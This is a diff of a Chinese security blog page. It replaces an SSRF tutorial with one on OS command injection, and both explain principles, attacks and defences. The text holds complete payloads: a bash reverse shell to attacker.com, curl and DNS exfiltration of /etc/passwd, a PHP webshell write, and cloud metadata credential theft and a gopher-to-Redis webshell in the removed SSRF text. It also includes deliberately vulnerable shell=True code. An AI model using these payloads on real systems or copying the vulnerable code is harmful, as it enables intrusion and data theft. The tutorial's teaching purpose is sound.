@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SSRF 服务端请求伪造：原理、攻击与防御, 是小竹不是小猪">
-    <meta name="description" content="一、核心原理SSRF（Server-Side Request Forgery，服务端请求伪造）的本质是攻击者让服务端代替自己向任意地址发起网络请求。
-与 CSRF 形成对称：CSRF 是借用户的浏览器向目标站发请求（攻击发生在客户端），SS">
+    <meta name="keywords" content="命令注入（OS Command Injection）：原理、攻击与防御, 是小竹不是小猪">
+    <meta name="description" content="一、核心原理命令注入（OS Command Injection）的本质是用户可控数据被操作系统 Shell 当作命令执行。
+这与 SQL 注入、XSS 的逻辑完全同构——SQL 注入是用户输入被数据库引擎当作 SQL 指令执行，XSS 是用">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SSRF 服务端请求伪造：原理、攻击与防御 | 是小竹不是小猪</title>
+    <title>命令注入（OS Command Injection）：原理、攻击与防御 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSRF 服务端请求伪造：原理、攻击与防御</h1>
+                    <h1 class="description center-align post-title">命令注入（OS Command Injection）：原理、攻击与防御</h1>
                 </div>
             </div>
         </div>
@@ -439,8 +439,8 @@
                                 <span class="chip bg-color">Web安全</span>
                             </a>
                         
-                            <a href="/tags/SSRF/">
-                                <span class="chip bg-color">SSRF</span>
+                            <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">命令注入</span>
                             </a>
                         
                     </div>
@@ -476,358 +476,400 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="一、核心原理"><a href="#一、核心原理" class="headerlink" title="一、核心原理"></a>一、核心原理</h3><p>SSRF（Server-Side Request Forgery，服务端请求伪造）的本质是<strong>攻击者让服务端代替自己向任意地址发起网络请求</strong>。</p>
-<p>与 CSRF 形成对称：CSRF 是借用户的浏览器向目标站发请求（攻击发生在客户端），SSRF 是借服务端的网络能力向内网或本地服务发请求（攻击发生在服务端）。</p>
-<pre><code>CSRF：攻击者 → 用户浏览器 → 目标站
-SSRF：攻击者 → 目标服务端 → 内网服务 / 云服务元数据 / 本地文件
-</code></pre>
-<p>理解 SSRF 需要抓住一个前提：很多 Web 应用有”代替用户去请求其他地址”的功能——图片加载（用户输入一个图片 URL，服务端下载后展示）、文件导入（用户提供一个远程文件地址，服务端拉取解析）、链接预览（用户贴一个链接，服务端抓取标题和摘要）、Webhook 回调（用户注册一个回调 URL，服务端在事件触发时通知）。</p>
-<p>这些功能的共同点是：服务端接受一个 URL 参数，然后主动发起 HTTP 请求。如果服务端没有校验这个 URL 的目标地址，攻击者就可以让它请求内网 IP、本地端口、云元数据接口——这些地址从外部网络是不可达的，但服务端在内网中，天然可以访问。</p>
-<p>一个完整的 SSRF 攻击需要满足两个条件：第一，应用有从用户输入中接受 URL 并发起请求的功能。第二，服务端没有对 URL 的目标地址做有效校验（如白名单、协议限制、内网 IP 过滤）。</p>
+                <h3 id="一、核心原理"><a href="#一、核心原理" class="headerlink" title="一、核心原理"></a>一、核心原理</h3><p>命令注入（OS Command Injection）的本质是<strong>用户可控数据被操作系统 Shell 当作命令执行</strong>。</p>
+<p>这与 SQL 注入、XSS 的逻辑完全同构——SQL 注入是用户输入被数据库引擎当作 SQL 指令执行，XSS 是用户输入被浏览器当作 JavaScript 执行，命令注入是用户输入被操作系统 Shell 当作系统命令执行。三者共享同一个根源：<strong>数据与指令的边界混淆</strong>。</p>
+<p>但命令注入的危害远大于前两者。SQL 注入影响的是数据库，XSS 影响的是浏览器，而命令注入直接影响操作系统——攻击者以 Web 应用进程的权限执行任意系统命令。如果 Web 应用以 root 权限运行，攻击者就获得了 root 权限。</p>
+<p>命令注入发生的前提是：应用代码将用户输入拼接到系统命令字符串中，然后通过 <code>system()</code>、<code>exec()</code>、<code>popen()</code>、<code>subprocess</code> 等函数执行。Shell 解析命令字符串时，遇到 <code>;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code>、<code>$()</code>、反引号等元字符，会改变命令的执行逻辑。</p>
 <hr>
-<h3 id="二、四种-SSRF-完整攻击实例"><a href="#二、四种-SSRF-完整攻击实例" class="headerlink" title="二、四种 SSRF 完整攻击实例"></a>二、四种 SSRF 完整攻击实例</h3><h4 id="2-1-基础-SSRF：探测和访问内网服务"><a href="#2-1-基础-SSRF：探测和访问内网服务" class="headerlink" title="2.1 基础 SSRF：探测和访问内网服务"></a>2.1 基础 SSRF：探测和访问内网服务</h4><p><strong>场景：</strong> 一个在线头像功能，用户输入图片 URL，服务端下载图片后裁剪为头像。</p>
-<pre><code>https://app.com/api/avatar?url=https://example.com/photo.jpg
+<h3 id="二、三种命令注入完整攻击实例"><a href="#二、三种命令注入完整攻击实例" class="headerlink" title="二、三种命令注入完整攻击实例"></a>二、三种命令注入完整攻击实例</h3><h4 id="2-1-直接命令注入：有回显的完整利用"><a href="#2-1-直接命令注入：有回显的完整利用" class="headerlink" title="2.1 直接命令注入：有回显的完整利用"></a>2.1 直接命令注入：有回显的完整利用</h4><p><strong>场景：</strong> 一个网络工具网站，提供 ping 功能。用户输入域名，服务端执行 <code>ping</code> 命令并返回结果。</p>
+<pre><code>https://tools.com/ping?host=example.com
 </code></pre>
-<p><strong>第一步：确认攻击面。</strong> 攻击者注册账号，进入头像设置页面。输入一个外部图片 URL，服务端正常下载并返回裁剪后的图片。抓包确认服务端确实发起了 HTTP 请求去下载图片。</p>
-<p><strong>第二步：探测内网。</strong> 攻击者将 URL 改为内网地址：</p>
-<pre><code>https://app.com/api/avatar?url=http://192.168.1.1
+<p><strong>第一步：确认注入点。</strong> 攻击者输入 <code>example.com</code>，服务端返回 ping 结果。抓包分析，确认服务端确实执行了系统命令。</p>
+<p>服务端代码大致如下：</p>
+<pre><code class="python"># 危险写法：用户输入直接拼入命令
+import os
+host = request.args.get(&#39;host&#39;)
+output = os.popen(f&#39;ping -c 4 &#123;host&#125;&#39;).read()
+return output
 </code></pre>
-<p>服务端向内网 <code>192.168.1.1</code> 发起 HTTP 请求。如果返回了内容（哪怕是一个错误页面），说明 SSRF 存在。攻击者通过响应时间、状态码、响应内容判断内网中有哪些主机和端口是开放的。</p>
-<p><strong>第三步：访问内网服务。</strong> 攻击者扫描到内网 <code>192.168.1.100:6379</code> 运行着 Redis（默认不设置密码），直接通过 SSRF 发送 Redis 命令：</p>
-<pre><code>https://app.com/api/avatar?url=http://192.168.1.100:6379/
+<p><strong>第二步：测试注入。</strong> 攻击者输入 <code>example.com; id</code>，服务端执行 <code>ping -c 4 example.com; id</code>。Shell 将 <code>;</code> 视为命令分隔符，先执行 <code>ping</code>，再执行 <code>id</code>。返回结果中出现了 <code>uid=33(www-data) gid=33(www-data)</code>，确认命令注入存在。</p>
+<p><strong>第三步：读取敏感文件。</strong></p>
+<pre><code>example.com; cat /etc/passwd
 </code></pre>
-<p>如果服务端使用的是简单的 HTTP 客户端（如 Python 的 <code>requests.get(url)</code>），请求会被发送到 Redis。Redis 是文本协议，会尝试解析 HTTP 请求的内容，虽然大部分会报错，但攻击者可以利用 <code>gopher://</code> 协议构造精确的 Redis 命令（见 2.3）。</p>
+<p>Shell 执行 <code>ping -c 4 example.com; cat /etc/passwd</code>，返回系统用户列表。</p>
+<pre><code>example.com; cat /var/www/html/config.py
+</code></pre>
+<p>读取应用配置文件，可能包含数据库密码、API 密钥。</p>
+<p><strong>第四步：获取反向 Shell。</strong> 攻击者在自己的服务器上启动监听：</p>
+<pre><code class="bash"># 攻击者机器上
+nc -lvnp 4444
+</code></pre>
+<p>然后通过命令注入发起反向连接：</p>
+<pre><code>example.com; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
+</code></pre>
+<p>Shell 执行后，目标服务器的 bash 进程连接到攻击者的 <code>nc</code> 监听端口。攻击者获得了一个交互式 Shell，可以像 SSH 登录一样操作目标服务器。</p>
 <p><strong>完整数据流：</strong></p>
-<pre><code>攻击者提交 url=http://192.168.1.100:6379
-  → 服务端接受 URL，发起 HTTP 请求到 192.168.1.100:6379
-  → 请求到达内网 Redis 服务
-  → Redis 收到非标准请求，返回错误信息
-  → 服务端将错误信息（或响应内容）返回给攻击者
-  → 攻击者确认内网 Redis 存在
+<pre><code>攻击者提交 host=example.com; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
+  → 服务端拼入命令：ping -c 4 example.com; bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
+  → Shell 解析 ; 分隔符，执行第二条命令
+  → bash 建立到 attacker.com:4444 的 TCP 连接
+  → 攻击者的 nc 接收到连接
+  → 攻击者获得目标服务器的交互式 Shell
+  → 可以执行任意系统命令，完全控制服务器
 </code></pre>
-<p><strong>为什么这能成功？</strong> 因为服务端在内网中，天然可以访问内网地址。攻击者从外部网络无法直接访问 <code>192.168.1.100</code>，但服务端可以。SSRF 就是借服务端的网络位置做跳板。</p>
-<h4 id="2-2-云元数据攻击：窃取云凭证"><a href="#2-2-云元数据攻击：窃取云凭证" class="headerlink" title="2.2 云元数据攻击：窃取云凭证"></a>2.2 云元数据攻击：窃取云凭证</h4><p><strong>场景：</strong> 应用部署在 AWS/阿里云/腾讯云等云平台上，同样有图片加载功能。</p>
-<p><strong>第一步：确认云环境。</strong> 攻击者尝试访问云平台的元数据服务地址：</p>
-<pre><code>https://app.com/api/avatar?url=http://169.254.169.254/latest/meta-data/
+<p><strong>为什么这能成功？</strong> 因为 Shell 解析命令字符串时，<code>;</code> 是命令分隔符，<code>|</code> 是管道符，<code>&amp;&amp;</code> 是逻辑与，<code>$()</code> 是命令替换。这些元字符改变了命令的结构，让攻击者注入的内容变成了独立的命令被执行。</p>
+<h4 id="2-2-盲命令注入：无回显的利用"><a href="#2-2-盲命令注入：无回显的利用" class="headerlink" title="2.2 盲命令注入：无回显的利用"></a>2.2 盲命令注入：无回显的利用</h4><p><strong>场景：</strong> 一个日志分析工具，用户输入日志文件路径，服务端用 <code>grep</code> 搜索关键词并将结果写入临时文件。前端只显示”处理完成”，不显示命令输出。</p>
+<pre><code class="python"># 无回显：结果写入文件，不返回给用户
+import os
+log_file = request.args.get(&#39;file&#39;)
+os.system(f&#39;grep &quot;ERROR&quot; /var/log/&#123;log_file&#125; &gt; /tmp/result.txt&#39;)
+return &#39;处理完成&#39;
 </code></pre>
-<p><code>169.254.169.254</code> 是 AWS/阿里云等云平台提供的链路本地地址（link-local），只有从云实例内部才能访问。它提供当前实例的元数据，包括 IAM 角色凭证。</p>
-<p><strong>第二步：获取 IAM 凭证。</strong> 如果 SSRF 存在，服务端向元数据服务发起请求，返回实例的元数据。攻击者逐步深入：</p>
-<pre><code># 获取 IAM 角色名
-https://app.com/api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-→ 返回: app-server-role
+<p><strong>第一步：确认盲注入存在。</strong> 攻击者输入 <code>app.log; sleep 10</code>。如果页面在 10 秒后才返回”处理完成”，说明 <code>sleep</code> 命令被执行了，命令注入存在。</p>
+<pre><code>app.log; sleep 10    → 页面 10 秒后返回 → 确认注入
+app.log; sleep 0     → 页面立即返回   → 对照验证
+</code></pre>
+<p><strong>第二步：通过 DNS 外带数据。</strong> 攻击者无法直接看到命令输出，但可以让服务端发起 DNS 查询，通过 DNS 记录传递数据：</p>
+<pre><code>app.log; curl http://$(whoami).attacker.com
+</code></pre>
+<p>Shell 执行 <code>whoami</code>，将结果作为子域名发送到 <code>attacker.com</code>。攻击者在 DNS 日志中看到 <code>www-data.attacker.com</code> 的查询记录，得知命令以 <code>www-data</code> 用户执行。</p>
+<p><strong>第三步：通过 HTTP 外带数据。</strong> 比 DNS 更灵活，可以传递大量数据：</p>
+<pre><code>app.log; curl http://attacker.com/log?data=$(cat /etc/passwd | base64)
+</code></pre>
+<p>Shell 读取 <code>/etc/passwd</code>，Base64 编码后作为 URL 参数发送到攻击者服务器。攻击者在 HTTP 日志中解码获取数据。</p>
+<p><strong>第四步：写入 WebShell。</strong> 即使没有回显，攻击者仍然可以写入文件：</p>
+<pre><code>app.log; echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; /var/www/html/shell.php
+</code></pre>
+<p>攻击者访问 <code>https://target.com/shell.php?cmd=id</code>，验证 WebShell 是否写入成功。</p>
+<p><strong>完整数据流（HTTP 外带）：</strong></p>
+<pre><code>攻击者提交 file=app.log; curl http://attacker.com/log?data=$(cat /etc/passwd | base64)
+  → 服务端执行：grep &quot;ERROR&quot; /var/log/app.log; curl http://attacker.com/log?data=$(cat /etc/passwd | base64)
+  → grep 执行完成（攻击者不关心结果）
+  → curl 读取 /etc/passwd，Base64 编码
+  → curl 向 attacker.com 发起 HTTP GET 请求，携带编码后的数据
+  → 攻击者在 HTTP 日志中获取 Base64 数据，解码得到 /etc/passwd 内容
+</code></pre>
+<p><strong>盲注入的关键思路：</strong> 虽然没有直接回显，但攻击者可以通过时间延迟确认漏洞存在，通过 DNS/HTTP 外带窃取数据，通过写入文件获取持久化访问。无回显不等于无危害。</p>
+<h4 id="2-3-间接命令注入：通过文件名和环境变量"><a href="#2-3-间接命令注入：通过文件名和环境变量" class="headerlink" title="2.3 间接命令注入：通过文件名和环境变量"></a>2.3 间接命令注入：通过文件名和环境变量</h4><p><strong>场景：</strong> 一个文件处理服务，用户上传文件，服务端用 <code>file</code> 命令检测文件类型，然后用 <code>convert</code>（ImageMagick）生成缩略图。</p>
+<pre><code class="python">import subprocess
+filename = secure_filename(uploaded_file.filename)  # 只过滤了路径分隔符
+filepath = f&#39;/tmp/uploads/&#123;filename&#125;&#39;
+uploaded_file.save(filepath)
 
-# 获取该角色的临时凭证
-https://app.com/api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-server-role
-→ 返回:
-&#123;
-  &quot;AccessKeyId&quot;: &quot;ASIA...&quot;,
-  &quot;SecretAccessKey&quot;: &quot;wJalr...&quot;,
-  &quot;Token&quot;: &quot;FwoGZXIvY...&quot;,
-  &quot;Expiration&quot;: &quot;2026-08-08T12:00:00Z&quot;
-&#125;
+# 危险：文件名被传入 shell 命令
+subprocess.call(f&#39;file &#123;filepath&#125;&#39;, shell=True)
+subprocess.call(f&#39;convert &#123;filepath&#125; -thumbnail 200x200 /tmp/thumb_&#123;filename&#125;&#39;, shell=True)
 </code></pre>
-<p><strong>第三步：利用凭证。</strong> 攻击者拿到 AK/SK/Token 后，用 AWS CLI 或 SDK 以该角色的权限操作云资源——读取 S3 桶中的文件、操作 RDS 数据库、启动新的 EC2 实例。</p>
-<p><strong>完整数据流：</strong></p>
-<pre><code>攻击者提交 url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role
-  → 服务端发起 HTTP 请求到 169.254.169.254
-  → 云平台元数据服务返回 IAM 临时凭证（AK/SK/Token）
-  → 服务端将凭证内容返回给攻击者
-  → 攻击者用凭证调用 AWS API，接管云资源
+<p><strong>第一步：构造恶意文件名。</strong> 攻击者上传文件，文件名为 <code>test.jpg; id</code>。<code>secure_filename()</code> 只过滤了 <code>../</code> 等路径分隔符，没有过滤 <code>;</code>。</p>
+<p><strong>第二步：命令注入触发。</strong> 服务端执行：</p>
+<pre><code class="bash">file /tmp/uploads/test.jpg; id
+convert /tmp/uploads/test.jpg; id -thumbnail 200x200 /tmp/thumb_test.jpg; id
 </code></pre>
-<p><strong>为什么这特别危险？</strong> 因为云凭证的权限通常很大（读写 S3、操作数据库、管理其他实例），而且临时凭证的有效期通常是几小时到几天。一次 SSRF 可能导致整个云环境被接管。</p>
-<p><strong>AWS 的防御措施：</strong> 2019 年后 AWS 推出了 IMDSv2，要求用 PUT 请求获取 session token，然后用 token 去获取元数据。简单的 HTTP GET 请求（SSRF 常用的方式）无法直接获取元数据。但如果 SSRF 支持 PUT 方法或使用 <code>gopher://</code> 协议，IMDSv2 仍可被绕过。</p>
-<h4 id="2-3-协议利用：gopher-dict-file-协议攻击内网"><a href="#2-3-协议利用：gopher-dict-file-协议攻击内网" class="headerlink" title="2.3 协议利用：gopher/dict/file 协议攻击内网"></a>2.3 协议利用：gopher/dict/file 协议攻击内网</h4><p><strong>场景：</strong> 服务端的 URL 解析不仅支持 <code>http://</code>，还支持其他协议（<code>file://</code>、<code>dict://</code>、<code>gopher://</code>、<code>ldap://</code>）。</p>
-<p><strong>第一步：读取本地文件。</strong> 如果服务端支持 <code>file://</code> 协议：</p>
-<pre><code>https://app.com/api/avatar?url=file:///etc/passwd
+<p><code>;</code> 后面的 <code>id</code> 被当作独立命令执行。</p>
+<p><strong>另一种间接注入：通过环境变量。</strong> 某些应用使用 <code>eval</code> 或模板引擎处理配置，配置值来自环境变量，而环境变量可以被用户间接控制：</p>
+<pre><code class="python"># 危险：eval 执行包含用户数据的字符串
+import os
+template = os.environ.get(&#39;GREETING&#39;, &#39;Hello&#39;)
+os.system(f&#39;echo &quot;&#123;template&#125; &#123;username&#125;&quot;&#39;)
+# 如果 template 被注入为 $(whoami)，命令变成：
+# echo &quot;$(whoami) admin&quot;
 </code></pre>
-<p>服务端读取本地文件 <code>/etc/passwd</code> 的内容，作为”图片数据”返回给攻击者。攻击者可以读取配置文件、密钥文件、源代码：</p>
-<pre><code>file:///etc/passwd
-file:///etc/shadow（需要权限）
-file:///root/.ssh/id_rsa
-file:///var/www/html/config.php
-file:///proc/self/environ（环境变量，可能包含数据库密码）
+<p><strong>通过 Git 配置注入：</strong> 如果应用执行 <code>git</code> 命令且参数来自用户输入：</p>
+<pre><code class="python"># 用户输入 repo_url = &quot;https://github.com/user/repo; malicious_command&quot;
+subprocess.call(f&#39;git clone &#123;repo_url&#125; /tmp/repo&#39;, shell=True)
 </code></pre>
-<p><strong>第二步：用 gopher 协议精确构造请求。</strong> <code>gopher://</code> 是最危险的协议，因为它可以向任意端口发送任意 TCP 数据。攻击者可以用它精确构造对内网服务的请求：</p>
-<pre><code># gopher:// 格式：gopher://host:port/原始TCP数据
-
-# 攻击内网 Redis，写入 WebShell
-gopher://192.168.1.100:6379/%0D%0A
-  CONFIG SET dir /var/www/html%0D%0A
-  CONFIG SET dbfilename shell.php%0D%0A
-  SET x &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;%0D%0A
-  SAVE%0D%0A
+<p><strong>完整数据流（文件名注入）：</strong></p>
+<pre><code>攻击者上传文件，文件名: test.jpg; curl http://attacker.com/$(whoami)
+  → 文件保存到 /tmp/uploads/test.jpg; curl http://attacker.com/$(whoami)
+  → 服务端执行：file /tmp/uploads/test.jpg; curl http://attacker.com/$(whoami)
+  → Shell 解析 ; 分隔符
+  → file 命令正常执行（处理 test.jpg 部分）
+  → curl 执行 whoami，将结果发送到 attacker.com
+  → 攻击者通过 DNS/HTTP 日志得知执行用户
 </code></pre>
-<p>URL 编码后的 <code>%0D%0A</code> 是 <code>\r\n</code>（CRLF），gopher 协议会将这些原始数据直接发送到 Redis 的 6379 端口。Redis 逐行解析命令，执行写入 WebShell 的操作。</p>
-<p><strong>第三步：攻击内网 MySQL。</strong> 类似地，用 gopher 协议构造 MySQL 认证和数据查询请求：</p>
-<pre><code>gopher://192.168.1.200:3306/%00...（MySQL 协议格式的认证和数据请求）
-</code></pre>
-<p><strong>完整数据流（gopher + Redis）：</strong></p>
-<pre><code>攻击者提交 url=gopher://192.168.1.100:6379/%0D%0A...
-  → 服务端 URL 解析器识别 gopher:// 协议
-  → 服务端向 192.168.1.100:6379 建立 TCP 连接
-  → 将 URL 中编码的原始数据解码后发送到 Redis
-  → Redis 执行 CONFIG SET + SET + SAVE 命令
-  → WebShell 被写入 /var/www/html/shell.php
-  → 攻击者访问 WebShell，获得服务器控制权
-</code></pre>
-<p><strong>为什么 gopher 最危险？</strong> 因为 HTTP 协议只能发 HTTP 请求，但内网中的很多服务（Redis、MySQL、Memcached、FastCGI）不识别 HTTP。gopher 协议允许发送任意 TCP 数据，等于给了攻击者一个通用的内网协议代理。</p>
-<p><strong>防御的关键：</strong> 限制服务端 URL 解析器支持的协议。大多数场景只需要 <code>http://</code> 和 <code>https://</code>，应该禁止 <code>file://</code>、<code>gopher://</code>、<code>dict://</code>、<code>ldap://</code> 等协议。</p>
-<h4 id="2-4-盲-SSRF：无回显但有影响"><a href="#2-4-盲-SSRF：无回显但有影响" class="headerlink" title="2.4 盲 SSRF：无回显但有影响"></a>2.4 盲 SSRF：无回显但有影响</h4><p><strong>场景：</strong> 服务端发起请求后不将响应内容返回给用户（如后台异步发送 Webhook 通知）。攻击者看不到服务端的响应，无法直接读取内网服务的数据。</p>
-<p><strong>第一步：确认盲 SSRF 存在。</strong> 攻击者注册一个 Webhook 回调 URL：</p>
-<pre><code>https://app.com/api/webhook?url=http://attacker.com/callback
-</code></pre>
-<p>服务端向 <code>attacker.com/callback</code> 发起请求。攻击者在自己的服务器上收到了请求，确认 SSRF 存在。</p>
-<p><strong>第二步：利用副作用。</strong> 虽然没有回显，但攻击者可以通过观察内网服务的行为变化来推断信息：</p>
-<p>端口扫描：将 URL 改为 <code>http://192.168.1.100:6379</code>，如果攻击者的回调很快收到响应（内网服务快速拒绝），说明端口开放；如果超时，说明端口关闭或被防火墙拦截。</p>
-<pre><code>url=http://192.168.1.100:6379   → 回调在 0.1s 后收到（端口开放，Redis 快速响应）
-url=http://192.168.1.100:9999   → 回调在 30s 后收到（端口关闭，连接超时）
-</code></pre>
-<p>触发内部操作：如果内网有一个管理接口 <code>http://192.168.1.50/admin/reset-all</code>，攻击者通过 SSRF 触发它，虽然看不到响应，但如果页面上所有用户的数据被重置了，就知道请求成功了。</p>
-<p><strong>DNS 外带：</strong> 如果 SSRF 支持 DNS 查询，攻击者可以让服务端解析一个攻击者控制的域名，通过 DNS 记录传递数据：</p>
-<pre><code>url=http://data.attacker.com/   ← 服务端向攻击者的 DNS 发起查询
-</code></pre>
-<p>攻击者在 DNS 日志中看到来自目标服务端 IP 的查询请求，确认 SSRF 存在，并获取了服务端的真实内网 IP。</p>
-<p><strong>完整数据流（盲 SSRF + 内部操作）：</strong></p>
-<pre><code>攻击者提交 url=http://192.168.1.50/admin/reset-all
-  → 服务端向 192.168.1.50 发起 HTTP GET 请求
-  → 内网管理接口执行重置操作
-  → 攻击者看不到响应内容
-  → 但攻击者观察到应用数据被重置 → 确认请求成功执行
-</code></pre>
-<p><strong>盲 SSRF 的难点：</strong> 攻击者无法直接读取内网数据，只能利用副作用（数据被修改、服务行为变化）来推断。但它的威胁仍然很大——如果内网有不需要认证就能触发操作的管理接口，盲 SSRF 就足够了。</p>
+<p><strong>间接注入的隐蔽性：</strong> 开发者可能认为”文件名是用户上传的，不是直接输入的”，忽略了文件名也是用户可控数据。任何传入 Shell 命令的用户数据——无论是表单参数、文件名、HTTP 头、环境变量——都是潜在的注入点。</p>
 <hr>
-<h3 id="三、防御策略详解"><a href="#三、防御策略详解" class="headerlink" title="三、防御策略详解"></a>三、防御策略详解</h3><h4 id="3-1-URL-白名单：只允许请求预定义的安全域名"><a href="#3-1-URL-白名单：只允许请求预定义的安全域名" class="headerlink" title="3.1 URL 白名单：只允许请求预定义的安全域名"></a>3.1 URL 白名单：只允许请求预定义的安全域名</h4><p>最直接的防御：服务端只允许请求白名单中的域名，其他一律拒绝。</p>
-<pre><code class="python">ALLOWED_DOMAINS = &#123;&#39;images.example.com&#39;, &#39;cdn.example.com&#39;&#125;
+<h3 id="三、Shell-元字符与注入语法"><a href="#三、Shell-元字符与注入语法" class="headerlink" title="三、Shell 元字符与注入语法"></a>三、Shell 元字符与注入语法</h3><p>理解命令注入需要理解 Shell 如何解析命令字符串。以下是所有可以改变命令结构的元字符：</p>
+<h4 id="3-1-命令分隔和链接"><a href="#3-1-命令分隔和链接" class="headerlink" title="3.1 命令分隔和链接"></a>3.1 命令分隔和链接</h4><pre><code class="bash"># 分号：顺序执行，无论前一条是否成功
+cmd1; cmd2            # cmd1 执行完后执行 cmd2
 
-def fetch_url(url):
-    parsed = urlparse(url)
-    if parsed.hostname not in ALLOWED_DOMAINS:
-        raise ValueError(f&quot;Domain &#123;parsed.hostname&#125; not allowed&quot;)
-    return requests.get(url)
+# 逻辑与：前一条成功才执行后一条
+cmd1 &amp;&amp; cmd2          # cmd1 成功（返回 0）才执行 cmd2
+
+# 逻辑或：前一条失败才执行后一条
+cmd1 || cmd2          # cmd1 失败（返回非 0）才执行 cmd2
+
+# 管道：前一条的输出作为后一条的输入
+cmd1 | cmd2           # cmd1 的标准输出传给 cmd2 的标准输入
+
+# 后台执行
+cmd &amp;                 # cmd 在后台执行
 </code></pre>
-<p><strong>为什么白名单最安全？</strong> 因为默认拒绝一切，只放行已知安全的地址。攻击者无论构造什么 URL，只要不在白名单中就会被拒绝。</p>
-<p><strong>白名单的常见绕过和注意事项：</strong></p>
-<p>域名解析绕过：攻击者注册 <code>evil.com</code>，将 <code>images.example.com.evil.com</code> 指向自己的服务器。如果白名单校验用 <code>endswith(&#39;example.com&#39;)</code>，这个域名会通过检查。正确做法是精确匹配或校验注册域。</p>
-<pre><code class="python"># 错误：endswith 可被绕过
-if parsed.hostname.endswith(&#39;example.com&#39;):  # images.example.com.evil.com 也通过
-    ...
+<p>攻击者最常用的分隔符是 <code>;</code>（无条件执行）和 <code>|</code>（将用户输入通过管道传给另一个命令）。<code>&amp;&amp;</code> 和 <code>||</code> 需要条件判断，使用场景较少。</p>
+<h4 id="3-2-命令替换"><a href="#3-2-命令替换" class="headerlink" title="3.2 命令替换"></a>3.2 命令替换</h4><pre><code class="bash"># $() 形式：执行括号中的命令，将输出替换到原位置
+echo $(whoami)        # 输出: www-data
 
-# 正确：精确匹配
-if parsed.hostname in ALLOWED_DOMAINS:
-    ...
-
-# 或者校验注册域
-import tldextract
-extracted = tldextract.extract(parsed.hostname)
-if extracted.registered_domain != &#39;example.com&#39;:
-    raise ValueError(&quot;Domain not allowed&quot;)
+# 反引号形式（旧语法）
+echo `whoami`          # 输出: www-data
 </code></pre>
-<p>DNS 重绑定攻击：攻击者设置 DNS 记录，第一次解析 <code>attacker.com</code> 返回合法 IP（通过白名单校验），第二次解析返回内网 IP（实际请求时）。两次 DNS 查询之间有时间差，白名单校验和实际请求使用的是不同的 IP。</p>
-<pre><code>第一次 DNS 查询（白名单校验时）：attacker.com → 1.2.3.4（合法 IP）→ 通过
-第二次 DNS 查询（实际发请求时）：attacker.com → 192.168.1.100（内网 IP）→ SSRF 成功
-</code></pre>
-<p>防御 DNS 重绑定：白名单校验后，用校验得到的 IP 地址直接发起请求（不再做第二次 DNS 解析），或者设置 DNS 缓存让两次解析返回相同结果。</p>
-<pre><code class="python">import socket
+<p>命令替换允许在命令参数中嵌套执行其他命令。攻击者可以用它读取数据并嵌入到 URL 中实现外带。</p>
+<h4 id="3-3-重定向"><a href="#3-3-重定向" class="headerlink" title="3.3 重定向"></a>3.3 重定向</h4><pre><code class="bash"># 输出重定向：将命令输出写入文件
+cmd &gt; file            # 覆盖写入
+cmd &gt;&gt; file           # 追加写入
 
-def safe_fetch(url):
-    parsed = urlparse(url)
-    # 解析域名得到 IP
-    ip = socket.gethostbyname(parsed.hostname)
-    # 校验 IP 不是内网地址
-    if is_internal_ip(ip):
-        raise ValueError(&quot;Internal IP not allowed&quot;)
-    # 用已解析的 IP 直接发起请求，避免 DNS 重绑定
-    new_url = url.replace(parsed.hostname, ip)
-    return requests.get(new_url)
-</code></pre>
-<h4 id="3-2-内网-IP-过滤：禁止请求私有地址"><a href="#3-2-内网-IP-过滤：禁止请求私有地址" class="headerlink" title="3.2 内网 IP 过滤：禁止请求私有地址"></a>3.2 内网 IP 过滤：禁止请求私有地址</h4><p>如果业务需要允许用户输入任意 URL（不能做域名白名单），至少要过滤内网 IP 地址：</p>
-<pre><code class="python">import ipaddress
+# 输入重定向：从文件读取作为命令输入
+cmd &lt; file
 
-INTERNAL_NETWORKS = [
-    ipaddress.ip_network(&#39;10.0.0.0/8&#39;),
-    ipaddress.ip_network(&#39;172.16.0.0/12&#39;),
-    ipaddress.ip_network(&#39;192.168.0.0/16&#39;),
-    ipaddress.ip_network(&#39;127.0.0.0/8&#39;),
-    ipaddress.ip_network(&#39;169.254.0.0/16&#39;),  # 云元数据地址
-    ipaddress.ip_network(&#39;0.0.0.0/8&#39;),
-    ipaddress.ip_network(&#39;::1/128&#39;),           # IPv6 回环
-    ipaddress.ip_network(&#39;fc00::/7&#39;),          # IPv6 私有地址
-]
+# 标准错误重定向
+cmd 2&gt; error.log
 
-def is_internal_ip(ip_str):
-    try:
-        ip = ipaddress.ip_address(ip_str)
-        return any(ip in network for network in INTERNAL_NETWORKS)
-    except ValueError:
-        return True  # 无法解析的 IP 一律拒绝
+# /dev/tcp：Bash 特殊的 TCP 连接（用于反向 Shell）
+bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
 </code></pre>
-<p><strong>校验时机很关键：</strong> 必须在 DNS 解析之后、发起请求之前校验 IP。如果只校验 URL 中的域名（<code>if &#39;192.168&#39; in url</code>），攻击者用域名指向内网 IP 就能绕过。</p>
